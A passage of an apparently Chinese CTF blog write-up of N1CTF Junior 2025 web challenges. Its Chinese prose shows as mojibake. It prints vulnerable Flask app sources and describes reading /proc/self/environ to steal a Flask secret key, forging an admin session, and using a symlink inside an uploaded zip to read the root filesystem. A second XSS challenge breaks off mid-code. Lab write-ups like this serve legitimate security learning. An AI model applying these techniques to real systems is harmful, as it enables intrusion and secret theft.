string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"ç”¨æˆ·åå·²å­˜åœ¨"</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"user"</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username            session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span> <span class="token operator">=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"æœªé€‰æ‹©æ–‡ä»¶"</span>        role <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> role <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            dirname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"dirname"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            dirname <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        target_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> dirname<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        zip_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> <span class="token string">"upload.zip"</span><span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"unzip -o </span><span class="token interpolation"><span class="token punctuation">&#123;</span>zip_path<span class="token punctuation">&#125;</span></span><span class="token string"> -d </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_dir<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼"</span>        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>zip_path<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"è§£å‹å®Œæˆï¼&lt;br>ä¸‹è½½åœ°å€: &lt;a href='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">(</span><span class="token string">'download'</span><span class="token punctuation">,</span> folder<span class="token operator">=</span>dirname<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'></span><span class="token interpolation"><span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span>host_url<span class="token punctuation">&#125;</span></span><span class="token string">download/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>dirname<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/a>"</span></span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/&lt;folder>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>folder<span class="token punctuation">)</span><span class="token punctuation">:</span>    target_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> folder<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"download.html"</span><span class="token punctuation">,</span> folder<span class="token operator">=</span>folder<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download/&lt;folder>/&lt;filename>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>folder<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> folder <span class="token punctuation">,</span>filename<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>            content<span class="token punctuation">,</span>            mimetype<span class="token operator">=</span><span class="token string">"application/octet-stream"</span><span class="token punctuation">,</span>            headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"Content-Disposition"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"attachment; filename=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹æ¥ key åº”è¯¥æ˜¯åœ¨ç¯å¢ƒå˜é‡é‡Œï¼ŒåŒæ ·çš„æ–¹æ³•è¯» &#x2F;proc&#x2F;self&#x2F;environ æ‹¿åˆ° <code>FLASK_SECRET_KEY=#mu0cw9F#7bBCoF!</code></p><p>ä¿®æ”¹ session çš„ role ä¸º adminï¼Œæˆä¸ºç®¡ç†å‘˜åå¯æŒ‡å®šä¸Šä¼ æ–‡ä»¶çš„ä½ç½®</p><p>æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯æ€ä¹ˆåˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªæ ¹ç›®å½•çš„è½¯é“¾æ¥åˆ° uploads ä¸‹ï¼Œç„¶åå†ä¸Šä¼ ä¸€æ¬¡ï¼ŒæŒ‡å®šä½ç½®ä¸ºè½¯é“¾æ¥åå³å¯</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913121806888.png"></p><p>ä¸Šä¼ åˆ°æ ¹ç›®å½•çš„è½¯é“¾æ¥ torootpathï¼ˆè¿™é‡Œæ˜¯ä¹‹å‰æŒ‡å®š dirname ä¸º <code>.</code>ï¼Œäºæ˜¯å¯ä»¥æŸ¥çœ‹ uploads ç›®å½•çš„å†…å®¹ï¼‰</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913121827451.png"></p><p>ç„¶åå†ä¸Šä¼ ä¸€æ¬¡ï¼ŒæŒ‡å®š dirname ä¸º torootpathï¼Œä½¿å…¶è§†ä¸ºç›®å½•è®¿é—®</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913121920087.png"></p><p>åˆ—å‡ºæ ¹ç›®å½•</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250913122056484.png"></p><p>è®¿é—®å³å¯å¾—åˆ° flag</p><p>åšå®Œäº†æ‰å‘ç°åé¢ä¸Šäº†é™„ä»¶</p><hr><h1 id="Unfinishedï¼ˆå¤ç°ï¼‰"><a href="#Unfinishedï¼ˆå¤ç°ï¼‰" class="headerlink" title="Unfinishedï¼ˆå¤ç°ï¼‰"></a>Unfinishedï¼ˆå¤ç°ï¼‰</h1><p>æ˜æ˜¾è¦ xss</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> LoginManager<span class="token punctuation">,</span> UserMixin<span class="token punctuation">,</span> login_user<span class="token punctuation">,</span> logout_user<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_required<span class="token keyword">import</span> requests<span class="token keyword">from</span> markupsafe <span class="token keyword">import</span> escape<span class="token keyword">from</span> playwright<span class="token punctuation">.</span>sync_api <span class="token keyword">import</span> sync_playwright<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'your-secret-key-here'</span>login_manager <span class="token operator">=</span> LoginManager<span class="token punctuation">(</span><span class="token punctuation">)</span>login_manager<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>login_manager<span class="token punctuation">.</span>login_view <span class="token operator">=</span> <span class="token string">'login'</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>UserMixin<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> bio<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">id</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>bio <span class="token operator">=</span> bioadmin_password <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>USERS_DB <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'admin'</span><span class="token punctuation">:</span> User<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">,</span> password<span class="token operator">=</span>admin_password<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>USER_ID_COUNTER <span class="token operator">=</span> <span class="token number">1</span><span class="token decorator annotation punctuation">@login_manager<span class="token punctuation">.</span>user_loader</span><span class="token keyword">def</span> <span class="token function">load_user</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> USERS_DB<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token operator">==</span> user_id<span class="token punctuation">:</span>            <span class="token keyword">return</span> user    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> USER_ID_COUNTER    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> USERS_DB<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Username already exists.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                USER_ID_COUNTER <span class="token operator">+=</span> <span class="token number">1</span>        new_user <span class="token operator">=</span> User<span class="token punctuation">(</span>            <span class="token builtin">id</span><span class="token operator">=</span>USER_ID_COUNTER<span class="token punctuation">,</span>            username<span class="token operator">=</span>username<span class="token punctuation">,</span>            password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span>        USERS_DB<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> new_user        login_user<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'ticket'</span><span class="token punctuation">,</span> <span class="token string">'your_ticket_value'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> USERS_DB<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">and</span> user<span class="token punctuation">.</span>password <span class="token operator">==</span> password<span class="token punctuation">:</span>            login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'Invalid credentials.'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        current_user<span class="token punctuation">.</span>bio <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'bio'</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>current_user<span class="token punctuation">.</span>bio<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ticket'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ticket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        ticket <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'ticket'</span><span class="token punctuation">]</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'ticket'</span><span class="token punctuation">,</span> ticket<span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'ticket.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/view"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">view_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    # I found a bug in it.    # Until I fix it, I've banned /api/bio/. Have fun :)    """</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>default<span class="token operator">=</span>current_user<span class="token punctuation">.</span>username<span class="token punctuation">)</span>    visit_url<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://localhost/api/bio/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""    &#123;&#123;% extends "base.html" %&#125;&#125;    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;    &#123;&#123;% block content %&#125;&#125;    &lt;h1>bot will visit your bio&lt;/h1>    &lt;p style="margin-top: 1.5rem;">&lt;a href="&#123;&#123;&#123;&#123; url_for('index') &#125;&#125;&#125;&#125;">Back to Home&lt;/a>&lt;/p>    &#123;&#123;% endblock %&#125;&#125;    """</span></span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/bio/&lt;string:username>"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">get_user_bio</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span>    user <span class="token operator">=</span> USERS_DB<span class="token punctuation">.</span>get<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">return</span> user<span class="token punctuation">.</span>bio<span class="token keyword">def</span> <span class="token function">visit_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        flag_value <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">,</span> <span class="token string">'flag&#123;fake&#125;'</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> sync_playwright<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>            browser <span class="token operator">=</span> p<span class="token punctuation">.</span>chromium<span class="token punctuation">.</span>launch<span class="token punctuation">(</span>headless<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token 